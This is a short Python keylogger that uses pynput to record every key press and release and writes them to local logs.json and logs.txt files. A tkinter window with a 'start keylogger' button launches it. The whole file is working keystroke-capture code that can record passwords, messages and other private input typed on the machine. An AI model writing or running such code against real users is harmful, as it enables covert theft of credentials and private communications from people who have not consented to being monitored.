from pynput import keyboard
import json
key_list=[]
x=False
key_strokes=""
import tkinter as tk
from tkinter import *
root=tk.Tk()
root.geometry("300x400")
def update_text_file(key):
    with open('logs.txt','a') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json','w+') as key_log:
        key_list_bytes=json.dumps(key_list)
        key_log.write(key_list_bytes)

def onpress(key):
    global x,key_list
    if x==False:
        key_list.append({'pressed':f'{key}'})
        x=True
    if x==True:
        key_list.append({'Held':f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x,key_list,key_strokes
    key_list.append(
        {'Realeased':f'{key}'}
    )
    if x==True:
        x=False
    update_json_file(key_list)

    key_strokes= key_strokes+ str(key)
    update_text_file(str(key_strokes))

def butaction():
    print("[+]Running keylogger succesfully!\n[!]saving the key logs in 'logs.json'")
    with keyboard.Listener(
        on_press=onpress,
        on_release=on_release) as listener:
        listener.join()

empty=Label(root,text='').grid(row=0,column=0)
empty=Label(root,text='').grid(row=1,column=0)
empty=Label(root,text='').grid(row=2,column=0)
empty=Label(root,text='Keylogger',font='Verdana 11 bold').grid(row=3,column=3)
empty=Label(root,text='').grid(row=4,column=0)
empty=Label(root,text='').grid(row=5,column=0)

Button(root,text="start keylogger",command=butaction).grid(row=6,column=3)
root.mainloop()